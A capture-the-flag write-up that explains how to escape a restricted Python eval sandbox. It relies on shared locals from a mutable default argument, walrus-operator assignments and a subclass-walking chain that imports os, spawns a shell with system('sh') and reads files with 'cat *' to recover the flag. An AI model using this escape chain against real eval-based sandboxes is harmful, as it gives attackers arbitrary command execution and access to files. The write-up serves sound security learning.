# Squeezing_Tightly_On_Arm &mdash; Solution

## Source code

We got the source code, and there are some interesting parts of the code:

* `del sys`
* `del FLAG`
* `loc={}`
* `eval(command, {'__builtins__': {}}, loc)`

## Forbbiden input

Before we pass the command to the `eval`, we must pass some checks:

* Max length of the line is 120
* We cannot use  `'`
* We can use `.()/+` only once.

## Safe eval

```
def safe_eval(command, loc={}):

    if not check(command):
        return

    return eval(command, {'__builtins__': {}}, loc)
```

Here, we see the `safe_eval` function. Globas and locals are set to empty `dict`.
But for locals, this is not true when we run `safe_eval` multiple times.

Because we use a default parameter (empty `dict`), `dict` is evaluated only once.
Python's default arguments are evaluated only once when the function is defined,
not each time the function is called: https://www.codecademy.com/learn/learn-intermediate-python-3/modules/int-python-function-arguments/cheatsheet.

This is good for us, because now we can run multiple commands and have some shared state.
But for creating some state we need assign operator, and we can not have `=` in `eval`.
There is solution for that, because we can use **the walrus operator**, `:=`.
We can have some expressions like this: `[a:="".__class__]`.


## Escape

Now we must find some way to escape from Python, and somehow we need to read the `FLAG`.
The main idea is to print our source code. Let's import `os` module and run `system` function:


```
[a:="".__class__]
[b:=a.__base__]
[c:=b.__subclasses__()]
[d:=[x.__init__ for x in c]]
[e:=[x for x in d if "wrapper" not in f"{x}"]]
[f:=[x for x in e if "builtins" in x.__globals__ ]]
[g:=f[0].__globals__["builtins"]]
[h:=g.__import__("os")]
h.system("sh")
```
We got the flag with `cat *`: TBTL{3SC4P1NG_FR0M_PYTH0N_15_N0T_4N_345Y_T45K}


